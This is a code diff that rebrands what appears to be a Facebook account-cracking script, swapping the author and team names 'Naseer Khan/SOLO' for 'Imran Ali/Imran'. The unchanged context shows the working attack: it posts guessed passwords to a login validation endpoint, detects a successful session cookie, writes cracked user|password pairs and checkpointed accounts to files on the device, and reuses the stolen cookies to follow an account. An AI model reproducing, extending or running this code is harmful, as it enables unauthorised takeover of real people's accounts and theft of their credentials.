@@ -156,7 +156,7 @@ def reg2():
 
 
 #MASUK TOKEN
-def MRSOLO(OK,cp):
+def MRIMRAN(OK,cp):
     if len(OK) != 0 or len(cp) != 0:
         print('\n----------------------------------------------')
         print(' Crack Has Been Completed.')
@@ -173,8 +173,8 @@ def python_java():
     ipm = requests.get(url_ip).json() 
     IP = ipm["origin"]
     print(" \033[1;95m ---------------------------------------------");time.sleep(0.03)
-    print(" \033[1;96m Author     :      \033[1;92mNaseer Khan")
-    print(" \033[1;96m Team       :      \033[1;92mSOLO")
+    print(" \033[1;96m Author     :      \033[1;92mImran Ali")
+    print(" \033[1;96m Team       :      \033[1;92mImran")
     print(" \033[1;96m Version    :       \033[1;92m0.01")
     print(" \033[1;95m ---------------------------------------------");time.sleep(0.03)
     print(" \033[1;97m IP ADDRESS        [%s]\n"%(IP));time.sleep(0.01)
@@ -272,10 +272,10 @@ class __xyz__:
                 po = session.post(f"https://{chachaji}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                 if 'c_user' in session.cookies.get_dict():
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                    print(f'\r{H} [SOLO-OK] {user} | {pw}')
+                    print(f'\r{H} [IMRAN-OK] {user} | {pw}')
                     wrt = '%s|%s' % (user,pw)
                     ok.append(wrt)
-                    open('/sdcard/SOLO-OK.txt' , 'a').write('%s\n' % wrt)
+                    open('/sdcard/IMRAN-OK.txt' , 'a').write('%s\n' % wrt)
                     self.follow(session,coki)
                     break
                 elif 'checkpoint' in session.cookies.get_dict():
@@ -287,17 +287,17 @@ class __xyz__:
                         print('\r%s \033[1;91m[SOLO-CP] %s | %s ' % (K,user,pw))
                         wrt = '%s|%s' % (user,pw)
                         cp.append(wrt)
-                        open('/sdcard/SOLO-CP.txt' , 'a').write('%s\n' % wrt)
+                        open('/sdcard/IMRAN-CP.txt' , 'a').write('%s\n' % wrt)
                         break
                     except (KeyError, IOError):
                         month = ''
                         day   = ''
                         year  = ''
                     except:pass
-                    print('\r%s \033[1;91m[SOLO-CP] %s | %s ' % (K,user,pw))
+                    print('\r%s \033[1;91m[IMRAN-CP] %s | %s ' % (K,user,pw))
                     wrt = '%s|%s' % (user,pw)
                     cp.append(wrt)
-                    open('/sdcard/SOLO-CP.txt' , 'a').write('%s\n' % wrt)
+                    open('/sdcard/IMRAN-CP.txt' , 'a').write('%s\n' % wrt)
                     break
                 else:
                     continue
@@ -331,7 +331,7 @@ class __xyz__:
                     except:
                         pass
 
-            MRSOLO(OK,cp)
+            MRIMRAN(OK,cp)
         elif chi in ('2', '02'):
 
             os.system('clear')
@@ -356,7 +356,7 @@ class __xyz__:
                     except:
                         pass
 
-            MRSOLO(OK,cp)
+            MRIMRAN(OK,cp)
         else:
             print('\n Select Valid One');self.__pler__()
 
